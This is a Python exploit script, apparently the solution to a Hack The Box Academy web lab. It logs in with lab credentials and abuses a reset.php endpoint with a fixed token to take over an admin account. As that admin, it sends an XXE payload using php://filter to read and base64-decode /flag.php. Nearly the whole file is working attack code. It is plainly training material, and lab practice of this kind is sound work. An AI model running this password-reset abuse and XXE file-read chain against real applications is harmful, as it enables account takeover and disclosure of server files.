import requests
import sys
from rich import print
import re
import base64

requests.packages.urllib3.disable_warnings()

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0'
}

s = requests.Session()

def login_and_reset():

	s = requests.Session()
	url = f"{sys.argv[1]}/index.php"
	data = {
		'username': "htb-student",
		'password': "Academy_student!"
	}
	response = s.post(url, data=data, headers=headers, proxies=proxies)
	print(f"[bold green]\n Logged In!\n")

	url = f"{sys.argv[1]}/reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=a"
	response = s.get(url, headers=headers, proxies=proxies)
	print(response.text)

def login_admin_and_xxe():

	s = requests.Session()
	url = f"{sys.argv[1]}/index.php"
	data = {
		'username': "a.corrales",
		'password': "a"
	}
	response = s.post(url, data=data, headers=headers, proxies=proxies)
	print(f"[bold green]\n Logged In with Admin account!!\n")

	url= f"{sys.argv[1]}/addEvent.php"
	xml = """<!DOCTYPE email [
  		<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
		]>
        <root>
        <name>&company;</name>
        <details>a</details>
        <date>0002-02-02</date>
        </root>
    """
	print(f"[bold green]\n FLAG XXE:\n")
	response = s.post(url, data=xml, headers=headers, proxies=proxies)
	filter = response.text
	match = re.search(r"Event\s+(.*?)\s+has been created", filter, re.DOTALL)
	if match:
		encoded_string = match.group(1)
		string_sem_aspas = encoded_string.strip("'") #Remove as aspas
		base64_bytes = string_sem_aspas.encode("ascii") #Converte o code base64 para ascii chars
		sample_string_bytes = base64.b64decode(base64_bytes) #Converte para o sitema de decode de base64
		sample_string = sample_string_bytes.decode("ascii") #Decoda os ascii chars
		print(sample_string)
	else:
		print("Error!")

def main():
	login_and_reset()
	login_admin_and_xxe()

main()
